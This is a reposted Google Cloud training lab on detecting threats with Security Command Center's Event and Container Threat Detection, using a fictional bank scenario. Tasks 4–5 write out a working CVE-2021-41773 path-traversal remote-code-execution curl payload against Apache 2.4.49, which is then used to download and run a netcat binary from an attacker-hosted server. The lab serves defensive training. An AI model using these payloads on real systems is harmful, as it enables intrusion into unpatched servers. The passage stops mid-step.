---
title: "Detect and Investigate Threats with Security Command Center - GSP1125"
seoTitle: "Detect and Investigate Threats with Security Command Center - GSP1125"
seoDescription: "Event Threat Detection is an integrated service of Security Command Center (SCC) that monitors Google Cloud logs for patterns signaling suspicious activitie"
datePublished: Thu Aug 22 2024 06:37:05 GMT+0000 (Coordinated Universal Time)
cuid: cm04wu2gc00010akzfhdh90li
slug: detect-and-investigate-threats-with-security-command-center-gsp1125
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1724305707432/3ccd3427-b831-45bf-84f2-5bb77f7acae9.jpeg
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1724308610718/b28cf349-af4d-4bc8-ac29-19fa146b1df4.jpeg
tags: detect-and-investigate-threats-with-security-command-center-gsp1125

---

## **Overview**

Event Threat Detection is an integrated service of Security Command Center (SCC) that monitors Google Cloud logs for patterns signaling suspicious activities.

Container Threat Detection is another integrated service of SCC. This service can continuously monitor GKE working nodes. When it detects suspicious events, it analyzes them to confirm whether they can be treated as incidents or not.

In this lab, you receive hands-on practice with SCC's threat detection features and learn how to investigate and triage common vulnerabilities associated with events, virtual machines, and containers. You learn how to surface and manage your findings with SCC's Event Threat Detection and Container Threat Detection.

### What you'll do

In this lab, you learn how to:

* Initiate and mitigate a threat with Event Threat Detection
    
* Configure a cloud environment to detect threats
    
* Manage SCC findings with Event Threat Detection
    
* Build an environment for detecting container threats
    
* Exploit a web server and detect issues with Container Threat Detection
    

### Prerequisites

It is recommended the learner has familiarity with the following before starting this lab:

* Fundamental understanding of cloud computing concepts
    
* Familiarity with the Google Cloud Console
    
* Familiarity with the Security Command Center interface
    
* Familiarity with containers and Google Kubernetes Engine is recommended, but not required
    

## **Scenario**

![5ce916afc496a60c.jpeg](https://cdn.qwiklabs.com/qO2i8mve9e0jOrBbEsDzPFfEkM1ea6S0a7mXdN%2FNS%2BA%3D align="left")

Cymbal Bank is an American retail bank with over 2,000 branches in all 50 states. It offers comprehensive debit and credit services that are built on top of a robust payments platform. Cymbal Bank is a digitally transforming legacy financial services institution.

Cymbal Bank was founded in 1920 under the name Troxler. Cymbal Group acquired the company in 1975 after it had been investing heavily in Cymbal Group's proprietary ATMs. As the bank grew into a national leader, they put strategic emphasis on modernizing the customer experience both in-person at their branches and digitally through an app they released in 2014. Cymbal Bank employs 42,000 people nationwide and, in 2019, reported $24 billion in revenue.

As a Cloud Security Engineer at Cymbal Bank, your task is to explore and implement robust security measures, leveraging Security Command Center's Event and Container Threat Detection capabilities for its Google Cloud resources. By integrating these services, you will ensure real-time monitoring, swift anomaly identification, and proactive vulnerability management for our event-driven architectures and containerized applications.

## **Setup and requirements**

### Before you click the Start Lab button

Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources will be made available to you.

This hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.

To complete this lab, you need:

* Access to a standard internet browser (Chrome browser recommended).
    

**Note:** Use an Incognito or private browser window to run this lab. This prevents any conflicts between your personal account and the Student account, which may cause extra charges incurred to your personal account.

* Time to complete the lab---remember, once you start, you cannot pause a lab.
    

**Note:** If you already have your own personal Google Cloud account or project, do not use it for this lab to avoid extra charges to your account.

### How to start your lab and sign in to the Google Cloud console

1. Click the **Start Lab** button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is the **Lab Details** panel with the following:
    
    * The **Open Google Cloud console** button
        
    * Time remaining
        
    * The temporary credentials that you must use for this lab
        
    * Other information, if needed, to step through this lab
        
2. Click **Open Google Cloud console** (or right-click and select **Open Link in Incognito Window** if you are running the Chrome browser).
    
    The lab spins up resources, and then opens another tab that shows the **Sign in** page.
    
    ***Tip:*** Arrange the tabs in separate windows, side-by-side.
    
    **Note:** If you see the **Choose an account** dialog, click **Use Another Account**.
    
3. If necessary, copy the **Username** below and paste it into the **Sign in** dialog.
    
    ```apache
    student-02-8a7525b4766d@qwiklabs.net
    ```
    
    You can also find the **Username** in the **Lab Details** panel.
    
4. Click **Next**.
    
5. Copy the **Password** below and paste it into the **Welcome** dialog.
    
    ```apache
    t3dcsZfL8RcJ
    ```
    
    You can also find the **Password** in the **Lab Details** panel.
    
6. Click **Next**.
    
    **Important:** You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.
    
    **Note:** Using your own Google Cloud account for this lab may incur extra charges.
    
7. Click through the subsequent pages:
    
    * Accept the terms and conditions.
        
    * Do not add recovery options or two-factor authentication (because this is a temporary account).
        
    * Do not sign up for free trials.
        

After a few moments, the Google Cloud console opens in this tab.

**Note:** To view a menu with a list of Google Cloud products and services, click the **Navigation menu** at the top-left.

![Navigation menu icon](https://cdn.qwiklabs.com/nUxFb6oRFr435O3t6V7WYJAjeDFcrFb16G9wHWp5BzU%3D align="left")

## **Enable the Security Command Center API**

1. Click on the **Navigation menu** in the top left corner of the Google Cloud console.
    
2. Select **APIs & Services** from the drop down and click on **Enable APIs & Services**.
    
3. Click **\+ Enable APIs & Services**
    
4. Search for `Security Command Center API` in the search box.
    
5. Click on **Security Command Center API**, then click **Enable**
    

## **Task 1. Initiate and mitigate a threat with Event Threat Detection**

Your first task as a Cloud Security Engineer for Cymbal Bank is to initiate and mitigate non-compliant accounts threats with Event Threat Detection.

![8da0945e074700f7.png](https://cdn.qwiklabs.com/yLiATC2UXTI91KY5Deyh1yu%2Fc6bvGjp%2B81S94awhjZs%3D align="left")

The Event Threat Detection service of SCC detects many threats by monitoring suspicious activities reported in Google Cloud logs. One of these activities might be delegating sensitive roles to an external user, such as someone who has a miscellaneous `gmail.com` account that isn't tied to your corporate domain.

This might happen in situations when an intruder has managed to access a GCP organization and now they are interested in establishing persistence. To do this, the hacker would grant sensitive roles to their `@gmail.com` account.

This delegation simulates establishing persistence. If a hacker accidentally gets temporary access to your system, they will need to establish persistence and to get access to a more stable account.

1. In the Google Cloud Console, open the navigation menu and select **IAM & Admin &gt; IAM**.
    
2. Press the **Grant Access** button.
    
3. In the "New principals" field, enter the demo email address `demouser1@gmail.com`
    
4. For the Role field, select **BigQuery &gt; BigQuery Admin** and click **Save**.
    
5. Open the navigation menu and select **Security &gt; Security Command Center &gt; Findings**.
    
6. Change the Time Range dropdown to the **Last 6 hours.**
    

You should see three Findings, two of which are related to the access you just granted:

* *Non org IAM member*
    
* *Persistence: IAM anomalous grant*
    

7. Click on the Finding **Non org IAM member** and scroll down to check the "Source display name" in the description of this Finding.
    
8. Ensure that the display name is set to Security Health Analytics—this is the SCC service that detected a misconfiguration in your Google Cloud Project.
    
9. Close the window with the Finding.
    
10. Click on the other Finding **Persistence: IAM anomalous grant** and scroll down to check the "Source display name" in the description of this Finding.
    
11. Ensure that the display name is set to "Event Threat Detection"—this is the SCC service that detected a misconfiguration in your Google Cloud Project.
    
12. Scroll to the top of the window and select the tab **Source Properties**.
    
13. In this tab expand the **Properties &gt; sensitiveRoleGrant** field.
    
14. There you can find the most important characteristics of this finding:
    

* **principalEmail:** who performed the suspicious action
    
* **bindingDetails:** information about the role and the member to whom this role has been granted
    
* **members:** to whom the permission has been granted
    

15. Close the Finding window.
    
16. From the navigation menu, select **IAM & Admin &gt; IAM**.
    
17. Click the checkbox next to the `demouser1@gmail.com` principal and click the button **Remove Access**.
    
18. Click **Confirm**.
    
19. Now open the navigation menu and select **Security &gt; Security Command Center &gt; Findings**.
    

Note that the Findings "Non org IAM member" has disappeared from the list of findings. This is because the Security Health Analytics service has checked the updated configuration of IAM policies and deactivated this Finding.

**Note:** If you still see this Finding in the list, please refresh the browser’s tab.

The Finding "Persistence: IAM anomalous grant" has not changed its status. It was initiated by the ETD service, and cannot be deactivated automatically. We have already investigated this Finding and we can be sure that the user from gmail.com domain does not have access to our project.

Click **Check my progress** to verify the objective.

Initiate and mitigate a threat with Event Threat Detection

**Check my progress**

**Note:** If you are receiving less than 20 points for this task in the "Checkpoints" right-hand column, click the "Check my progress" button a couple of times.

## **Task 2. Configure a cloud environment to detect threats**

Now that you've investigated and checked for non-compliant accounts, you'll configure Cymbal's environment to detect service account threats through logging.

![fd5c653fce1f1a4.png](https://cdn.qwiklabs.com/um2UhA%2B1%2F3jv2znF0TeprxbvqLtN8h8EeQ%2FvEib16io%3D align="left")

Many logs in Google Cloud are enabled by default, but for detecting specific threats you will need to enable additional data access logs. In this exercise we will investigate the [Service Account Self-Investigation](https://cloud.google.com/security-command-center/docs/how-to-investigate-threats#service_account_self-investigation) threat.

In this scenario, a malicious actor exploits vulnerable software on a virtual machine and obtains access to the Default Service Account (which was used to create the instance). The actor wants to understand what they can do in the Google Cloud environment. To check their permissions, the actor will call the [projects.getIamPolicy method](https://cloud.google.com/resource-manager/reference/rest/v3/projects/getIamPolicy). SCC should detect and report this suspicious activity recorded in the logs.

For SCC to detect this activity, we need to enable Resource Manager Admin Read logs.

1. In the Google Cloud Console open the navigation menu and select **IAM & Admin &gt; Audit Logs.**
    

**Note:** You can safely ignore the message: "You don't have permission to view inherited audit logs configuration data for one or more parent resources."

2. In the list of services find **Cloud Resource Manager API** and click the checkbox next to it.
    

**Note:** If you cannot find it, scroll down to the parameter "Rows per page" and set its value to 200.

3. On the right side of the tab, find the configuration frame: **Cloud Resource Manager API - Permission Types**.
    
4. Select the **Admin Read** check box and click **Save.**
    

Now Resource Manager Data Read audit logs are collected and Event Threat Detection can analyze them.

For reproducing the scenario, you will need to create a new virtual machine with a default Service Account and `cloud-platform` access scope.

5. Open the navigation menu and select **Compute Engine &gt; VM instances**.
    
6. Then click the **Create Instance** button.
    
7. Select region as `us-east4` and set zone as `us-east4-b`.
    
8. In the "Access scopes" section, select the **Allow full access to all Cloud APIs** value.
    
9. Leave all other parameters set to their default value.
    
10. Click **Create** to launch the new VM instance.
    
11. Once the instance is created, click on the **SSH** button.
    
12. Accept the authorization prompts when the new SSH window opens.
    
13. In the SSH session, enter the following command:
    

```apache
gcloud projects get-iam-policy $(gcloud config get project)
```

You should see the list of IAM permissions granted to users in the Google Cloud project.

14. Open the navigation menu and select **Security &gt; Security Command Center &gt; Findings.**
    
15. Set the value of the time range selector to **Last hour**.
    

You should see **5** Security Findings related to the instance you just created:

* *Discovery: Service Account Self-Investigation*
    
* *Full API access*
    
* *Default service account used*
    
* *Compute secure boot disabled*
    
* *Public IP address*
    

The Finding "Discovery: Service Account Self-Investigation" was initiated by Event Threat Detection (ETD), which classifies findings with the *THREAT* Finding Class.

Other findings have been initiated by the Security Health Analytics component, which classifies Findings as *MISCONFIGURATION*.

16. Click on the Finding **Discovery: service account self-investigation**.
    
17. Select the **Source Properties** tab at the top of the window.
    
18. Now expand the field **properties &gt; serviceAccountGetsOwnIamPolicy**.
    
19. Inspect the following values:
    

* **principalEmail** - the email address of the Service Account that is investigating its own permissions
    
* **callerIp** - IP address from which the `projects.getIamPolicy` method was called. In our case it should be the external IP address of the virtual machine `instance-1`.
    

20. Exit out of the Finding window.
    

Outside of this scenario, this Finding can inform us that our virtual machine and the default Service Account have been compromised and we need to investigate and contain this incident.

Now that we've investigated this finding, let's mute it.

21. Click on the checkbox next to the **Discovery: Service Account Self-Investigation** Finding.
    
22. Click on the **MUTE OPTIONS** drop-down list.
    
23. Then select the **Mute** option.
    
24. Ensure that this Finding no longer appears in the SCC interface.
    

Click **Check my progress** to verify the objective.

Configure a cloud environment to detect threats

**Check my progress**

## **Task 3. Manage SCC findings with Event Threat Detection**

As you see, for detecting some threats you need to enable additional logs, which are not enabled by default. For detecting some findings, you also need to create additional configurations, such as DNS policies.

This will allow you to detect malicious software running on compute resources and identify well-known malicious DNS addresses.

When a DNS request is made on a virtual machine, this query is not logged by default, and in turn SCC cannot detect connections to malicious internet resources.

In the previous task, we enabled logs for the Resource Manager service using an IAM configuration. For logging all DNS queries, you will need to create a DNS policy with enabled logging.

**Note:** You can learn more about logging and monitoring metrics for Cloud DNS [here](https://cloud.google.com/dns/docs/monitoring).

1. To enable full DNS query logging, open the navigation menu and select **Network services &gt; Cloud DNS.**
    
2. Select the "DNS Server Policies" tab and then click the **Create Policy** button.
    
3. Enter **dns-test-policy** for the name of the DNS policy.
    
4. Select the **On** radio-button for DNS logs.
    
5. In the "Alternate DNS servers" part, select **default** from the network dropdown and click **OK**.
    
6. Click the **Create** button.
    
7. Now return to the SSH session of our virtual machine and try connecting to the malicious URL by running the following command:
    

```apache
curl etd-malware-trigger.goog
```

You should receive a similar output:

```xml
<!DOCTYPE html>
<html lang="en-us">
<meta charset="utf-8">
<title>ETD Malware Trigger</title>
<p>This domain is used to trigger a malware finding in Google Event Threat Detection. For more information, please visit <a href="https://cloud.google.com/event-threat-detection">https://cloud.google.com/event-threat-detection</a>
```

8. Return to the Google Cloud Console.
    
9. Open the navigation menu and select **Security &gt; Security Command Center &gt; Findings**.
    
10. You should now see a new threat appear "Malware: Bad Domain"
    

**Note:** If you don't see the new threat, refresh your browser window.

11. Click on this Finding.
    
12. In the new window, click on the **SOURCE PROPERTIES** tab.
    
13. Expand the **properties** field and examine the following:
    

* **domains:** the list of domains for which the instance requested address resolution
    
* **instanceDetails:** the ID of the instance that connected to the "malicious" domain
    

14. Close the Finding Window.
    
15. Click on the checkbox near the Finding **Malware: Bad Domain**.
    
16. Now click on the **Mute Options** drop-down list.
    
17. Click **Mute**. This Finding will now be removed from the SCC interface.
    
18. From the navigation menu, select **Compute Engine &gt; VM instances.**
    
19. Click on the checkbox next to the virtual machine instance you created previously and press **Delete.**
    
20. Confirm the delete action by clicking **Delete**.
    

Click **Check my progress** to verify the objective.

Manage SCC findings with Event Threat Detection

**Check my progress**

## **Task 4. Build an environment for detecting container threats**

Cymbal Bank is focused on enhancing their corporate banking application's scalability through Google Kubernetes Engine (GKE). To ensure the utmost security for their containers, you will implement Container Threat Detection to actively monitoring the security status of each container, detecting potential threats in real-time, and promptly notifying your team of any incidents.

With this proactive approach and seamless integration with Google Cloud Security Command Center, you can confidently safeguard Cymbal's deployments and services to maintain a robust security posture.

Container Threat Detection (CTD) is a special service that tracks suspicious activities happening inside GKE-based workloads. Currently CTD supports detection of several threats, such as:

* **Added binary executed:** initiated when a new binary, which was not a part of a container, is launched.
    
* **Added library loaded:** similar to the previous finding, but monitors only newly launched libraries.
    
* **Reverse shell:** a process inside of the container redirects network streams to a remote socket.
    
* **Malicious script executed:** a machine learning model analyzes behavior of launched bash scripts and reports malicious activities.
    
* **Malicious URL observed:** Container Threat Detection finds a malicious URL in the argument list of a running process. The list of malicious URLs is defined by Google's [Safe Browsing Service](https://developers.google.com/safe-browsing).
    

In this task, you are going to simulate an attack on a vulnerable and improperly configured instance of an Apache server (version 2.4.49).

When this version of the Apache server has the cgi-bin module enabled, it does not protect files outside dedicated directories, which allows a remote code execution attack.

You can read more about this vulnerability on the page [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773). Since we are using vulnerable software for these experiments, we will perform all activities in resources that are not exposed to the public internet and have only internal IP addresses.

1. To start experimenting with Container Threat Detection, open a new Cloud Shell session and run the following command to create a new VM instance `attacker-instance`:
    

```apache
gcloud compute instances create attacker-instance \
--scopes=cloud-platform  \
--zone=us-east4-b \
--machine-type=e2-medium  \
--image-family=ubuntu-2004-lts \
--image-project=ubuntu-os-cloud \
--no-address
```

This will create an "attacker instance", which will simulate the machine of a malicious actor.

Note that this instance does not have any external IP addresses, so we need to modify the configuration of our VPC network to reach Google Cloud APIs.

2. Run the following command to enable [Private Google Access](https://cloud.google.com/vpc/docs/configure-private-google-access#gcloud_2) for reaching Google Cloud APIs from this instance and the GKE cluster:
    

```apache
gcloud compute networks subnets update default \
--region=us-east4 \
--enable-private-ip-google-access
```

Click **Check my progress** to verify the objective.

Build an environment for detecting container threats

**Check my progress**

3. Open the navigation menu and select **Compute Engine &gt; VM Instances**.
    
4. Once the instance is created, click on the **SSH** button to access the `attacker-instance`.
    

**Note:** refresh your browser window if the instance creation takes over a minute.

5. Accept the authorization prompts when the new SSH window opens.
    

**Warning:** perform all shell commands using the CLI from the SSH window in the "attacker-instance". This instance has access and permission to work with all necessary Google APIs and the management interface for a GKE cluster. **Do not enter commands in Cloud Shell!**

You will first remove the preinstalled version of the Google Cloud CLI. Our machine is not connected to the Internet, so snap-based installation will not work in this environment properly. Instead we will install and use a Linux 64-bit archive file version. This is necessary because we will need to add additional components for connecting to the GKE cluster.

6. Run the following commands to complete those operations:
    

```apache
sudo snap remove google-cloud-cli
```

```apache
curl -O https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-438.0.0-linux-x86_64.tar.gz
```

```apache
tar -xf google-cloud-cli-438.0.0-linux-x86_64.tar.gz
```

```apache
./google-cloud-sdk/install.sh
```

7. When prompted to help improve the Google Cloud CLI, enter **N**.
    
8. When prompted to modify your profile to update your $PATH, enter **Y**.
    
9. Press **Enter** to use the standard rc file location.
    
10. Update the configuration of your environment:
    

```apache
. ~/.bashrc
```

11. Install additional authorization components for working with GKE:
    

```apache
gcloud components install kubectl gke-gcloud-auth-plugin
```

12. When prompted to install components, press **Y**.
    
13. Run the following command to deploy a private GKE cluster on which we will launch a vulnerable version of Apache.
    

```apache
gcloud container clusters create test-cluster \
--zone "us-east4-b" \
--enable-private-nodes \
--enable-private-endpoint \
--enable-ip-alias \
--num-nodes=1 \
--master-ipv4-cidr "172.16.0.0/28" \
--enable-master-authorized-networks \
--master-authorized-networks "10.150.0.0/20"
```

**Note:** it may take a few minutes for this command to complete.

14. Observe the cluster creation process by returning to the Google Cloud Console and opening the navigation menu and selecting **Kubernetes Engine &gt; Clusters**.
    
15. Once you receive an output similar to the following, your cluster has been created and you can move ahead:
    

![1a81d53c913d318d.png](https://cdn.qwiklabs.com/OLOnhW27OdES2OINNR7%2FqRfsQITtDYGu9XaPkAfYJ7A%3D align="left")

When a new GKE cluster is launched it usually creates several objects that Container Threat Detection can monitor. The most important is the DaemonSet "container-watcher", which generates findings.

**Note:** A DaemonSet ensures that all (or selected) nodes run a copy of a Pod.

16. Return to your SSH session and run the following command to check the configuration of this DaemonSet by running this command:
    

```apache
kubectl describe daemonsets container-watcher -n kube-system
```

It will take a few minutes for an output to be generated. If you get a message similar to the following:

```apache
Error from server (NotFound): daemonsets.apps "container-watcher" not found
```

Wait a moment and rerun the command. After a few minutes, you should receive the following output:

```apache
Name:           container-watcher
Selector:       container-watcher-unique-id=adbc885a,k8s-app=container-watcher
Node-Selector:  kubernetes.io/os=linux
Labels:         BUILD_BASELINE_CHANGELIST=579306457
                k8s-app=container-watcher
                ktd-version=ktd_release.watcher_20231103.01_RC00
Annotations:    deprecated.daemonset.template.generation: 1
Desired Number of Nodes Scheduled: 1
Current Number of Nodes Scheduled: 1
Number of Nodes Scheduled with Up-to-date Pods: 1
```

You can safely disregard any warnings or creation errors. The last message in the log will signify a SuccessfulCreate state.

17. Launch a new deployment in your cluster using the vulnerable version of the Apache server:
    

```apache
kubectl create deployment apache-deployment \
--replicas=1 \
--image=us-central1-docker.pkg.dev/cloud-training-prod-bucket/scc-labs/ktd-test-httpd:2.4.49-vulnerable
```

18. Since our configuration is very simple and consists of only one Pod and one Node, we will use the NodePort service to expose the port of our running container to the internal VPC network:
    

```apache
kubectl expose deployment apache-deployment \
--name apache-test-service  \
--type NodePort \
--protocol TCP \
--port 80
```

19. Run the following command to find the values of the `NODE_IP` and the `NODE_PORT` on which our GKE-based Apache server is listening:
    

```apache
NODE_IP=$(kubectl get nodes -o jsonpath={.items[0].status.addresses[0].address})
NODE_PORT=$(kubectl get service apache-test-service \
-o jsonpath={.spec.ports[0].nodePort})
```

20. Create a new VPC firewall rule allowing connection to the `NODE_PORT` and try reaching it using the curl command:
    

```apache
gcloud compute firewall-rules create apache-test-service-fw \
--allow tcp:${NODE_PORT}

curl http://${NODE_IP}:${NODE_PORT}
```

You should see the text representation of the start web page of our vulnerable Apache server:

```xml
<html><body><h1>It works!</h1></body></html>
```

During the exploitation phase we will need to build a reverse connection from the Apache container to the attacker machine.

21. Create one more firewall rule for making this connection to the port 8888 possible:
    

```apache
gcloud compute firewall-rules create apache-test-rvrs-cnnct-fw --allow tcp:8888
```

**Note:** Port 8888 is selected randomly, later on the attacker-instance we will launch a server, listening on this port.

Now that you have prepared the vulnerable infrastructure, you can start exploiting the vulnerable software. Please note that from now on you will not change any configuration of the application.

In the next task, you will behave as an intruder from the internet-based VM workstation which has access to the URL `http://${NODE_IP}:${NODE_PORT}`. Here is a diagram that demonstrates our configuration:

![1b859b49291b1b12.png](https://cdn.qwiklabs.com/RoyH%2BRdCyoAvFL36uQ39r19nWp%2B3o%2FEnV9G8Sldem2w%3D align="left")

We run the "curl" command on the Attacker instance and connect to the Apache web server. In turn, the Apache web server returns its main web page.

Click **Check my progress** to verify the objective.

Deploy a private GKE cluster

**Check my progress**

## **Task 5. Exploit a web server and detect issues with Container Threat Detection**

1. Run the following command to try and exploit our web server:
    

```apache
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; id"
```

In the above command, you are calling a "/bin/sh" command on the remote linux container where the Apache server is running.

In the output you should see the following string:

```apache
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

This is the output of the id command. From this output we can understand that the remote Apache server is running with permissions of the "daemon" user.

Practically, this means that an intruder can run any commands on the remote Apache server without having any additional access like SSH.

You can try to elevate our permissions from the "daemon" to the "root" user, but this is not the purpose of this exercise. This simulation might look unrealistic, but when this exploit was detected for the first time, there were thousands of vulnerable versions of the Apache server running in the global Internet.

On the diagram you can see what is happening:

![26646de06a100bc9.png](https://cdn.qwiklabs.com/ohyh63fQ%2FBaQMk68OeeS3vy3G5QUEmdIX%2B1FdW05o1s%3D align="left")

* **1.** We run the "curl" command on the Attacker instance and connect to Apache
    
* **2.** Apache runs the "id" command using "/bin/sh" shell
    
* **3.** The "id" commands returns output to the Apache
    
* **4.** Apache returns the output of the "id" command to the Attacker instance
    

Our vulnerable Apache service is not exposed to the external world, we have built an internal-only configuration, so now we can investigate a bit further. You can experiment with different commands and try to explore the remote environment.

2. Check the list of files in the root directory:
    

```apache
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; ls -l /"
```

You should receive a similar output:

```apache
total 68
drwxr-xr-x   1 root root 4096 Sep 28  2021 bin
drwxr-xr-x   2 root root 4096 Jun 13  2021 boot
drwxr-xr-x   5 root root  360 Jul 14 00:13 dev
................................................
```

3. Check the hostname of the remote host:
    

```apache
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; hostname"
```

You should receive a similar output:

```apache
apache-deployment-589dfc5b65-xst6c
```

Running the "curl" command is a working way to explore the remote environment, but we will try to implement a Reverse Shell channel to establish interactive access to the affected environment.

A Reverse Shell tactic is an advanced way to establish a connection from a victim machine to the attacker's host. This is a very serious security breach, and Security Command Center should immediately report any attempts of running processes to attach standard input to a remote socket.

You can read more about this tactic on the page: [Reverse Shell: How It Works, Examples and Prevention Tips](https://www.aquasec.com/cloud-native-academy/cloud-attacks/reverse-shell-attack/). There are many ways to implement this type of attack, but we will use the classic way of using [Netcat traditional.](https://manpages.debian.org/unstable/netcat-traditional/nc.traditional.1.en.html)

"Netcat traditional" has not been included into the running container, so we need to inject this piece of software to the running container. This will help us to initiate another SCC Finding about running software which was not included into the original container.

Hackers usually prepare statically linked and precompiled pieces of software. For this lab we will use the "nc.traditional" file which is publicly available as a part of the Debian 11 package [Package: netcat-traditional (1.10-41.1)](https://packages.debian.org/bullseye/netcat-traditional).

This is a dynamically linked file dependent on two standard libraries. As our container `ktd-test-httpd:2.4.49-vulnerable` is based on Debian 11, the newly introduced "nc.traditional" binary can be successfully launched inside our container.

The package itself can be downloaded from the page [netcat-traditional\_1.10-41.1\_amd64.deb](http://ftp.us.debian.org/debian/pool/main/n/netcat/netcat-traditional_1.10-41.1_amd64.deb), but we have prepared a local version for you in a GCS bucket (our environment does not have any connection to the Internet).

4. Download it to the "attacker-instance" using the following set of commands to extract a binary file that we need:
    

```apache
gsutil cp \
gs://cloud-training/gsp1125/netcat-traditional_1.10-41.1_amd64.deb .
mkdir netcat-traditional
dpkg --extract netcat-traditional_1.10-41.1_amd64.deb netcat-traditional
```

Now you can find a necessary binary file in the home directory on the Attacker instance: `~/netcat-traditional/bin/nc.traditional`

Now we need to upload it to the target container from inside of this container. For that we will start a simple web server on our attacker instance and will fetch the file nc.traditional from the container itself.

5. First of all please determine the local IP address of our "attacker-instance" workstation:
    

```apache
LOCAL_IP=$(ip -4 addr show ens4 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
echo ${LOCAL_IP}
```

**Note:** it's highly likely that your local IP will resemble "`10.150.0.0/20`" because you have launched this VM in the `us-east4` region.

6. Now start a primitive python-based web-server in background mode:
    

```apache
python3 -m http.server --bind ${LOCAL_IP} \
--directory ~/netcat-traditional/bin/ 8888 &
```

Technically this is not a fully-functional web server, this is simply a python module that helps sharing files using HTTP protocol.

**Note:** You might see the message `Serving HTTP on 10.150.0.0/20 port 8888 (http://10.150.0.0/20:8888/)`. If you don't see a command prompt, press enter.

7. Now check whether our local web server works or not by using the curl command:
    

```apache
curl http://${LOCAL_IP}:8888
```

You should see an HTML page representing a directory `~/netcat-traditional/bin/`, which should be similar to the following:

```xml
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="nc.traditional">nc.traditional</a></li>
</ul>
<hr>
</body>
</html>
```

Now we will connect to our vulnerable Apache server and force fetch the `nc.traditional` file from our newly launched web server. We are doing this because we cannot upload any data to this container by initiating connection from the attacker instance.

8. On the container itself we initiate downloading the nc.traditional from our "attacker-instance" using the following `curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc` command:\`
    

```apache
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc"
```

You should receive a similar output:

```bash
10.8.0.8 - - [21/Jul/2023 04:20:18] "GET /nc.traditional HTTP/1.1" 200 -
```

You can see the process of uploading the nc.traditional on this diagram:

![7da191ae7a35d011.png](https://cdn.qwiklabs.com/4roir5DhTXeJKDrWvfwo2hc3SG3OvEWFvr0xO9mw1QI%3D align="left")

* **1.** We run the `curl` command on the Attacker instance and connect to the Apache
    
* **2.** Apache runs the `curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc` command using `/bin/sh` shell.
    
* **3.** The `curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc` command connects to the Attackers instance
    
* **4.** The `curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc` command fetches the `nc.traditional` binary file
    
* **5.** The `curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc` command saves the `nc.traditional` binary file as `/tmp/nc` file in the running container
    
* **6.** The `curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc` command returns the message `10.8.0.8 - - [15/Jul/2023 18:11:34] "GET /nc.traditional HTTP/1.1" 200 -` to Apache
    
* **7.** Apache confirms that the remote command was executed successfully
    

9. Now netcat-traditional is on the remote container. Make it executable by using the `chmod +x /tmp/nc` command
    

```apache
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; chmod +x /tmp/nc"
```

We have just downloaded a binary file to the Apache container, so we do not need our primitive Python-based web server anymore.

10. On the attacker's workstation enter this command to interrupt the running Python web-service:
    

```apache
pkill python
```

11. **Ensure you receive a similar message**, which signals that your web-server has been successfully terminated (you might need to press "enter" a couple of times to see this message).
    

```apache
[1]+  Terminated              python3 -m http.server --bind ${LOCAL_IP} --directory ~/netcat-traditional/bin/ 8888
```

**Warning:** If you don't see the above output, run the command again.

12. Run the following command to confirm there are no processes listening on any TCP ports:
    

```apache
lsof -i -sTCP:LISTEN
```

13. Run the following command to launch the `/tmp/nc` file inside our container:
    

```apache
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; /tmp/nc"
```

This binary file was not included into the image when the image was built, so SCC must detect it and initiate the Finding [Added Binary Executed](https://cloud.google.com/security-command-center/docs/how-to-investigate-threats#added_binary_executed).

14. Return to the Google Cloud Console.
    
15. Open the navigation menu and select **Security &gt; Security Command Center &gt; Risk overview**.
    
16. Set the Time range selector to **Last hour**.
    
17. In the "New threats over time" panel, find the finding **Added Binary Executed**:
    

![35fd976cddca6417.png](https://cdn.qwiklabs.com/5VeBfrSD0YXPpm7P0i00s6FxQM776yJttVd9TM%2BzudQ%3D align="left")

As you can see, it has "Critical" Severity, which means that an intruder is able to access, modify, or delete data, or execute unauthorized code within your existing resources.

You can find more information about different levels on the page [severity classifications for findings](https://cloud.google.com/security-command-center/docs/finding-severity-classifications).

18. Click on this **Findings**.
    
19. Click on the URL underneath the category section:
    

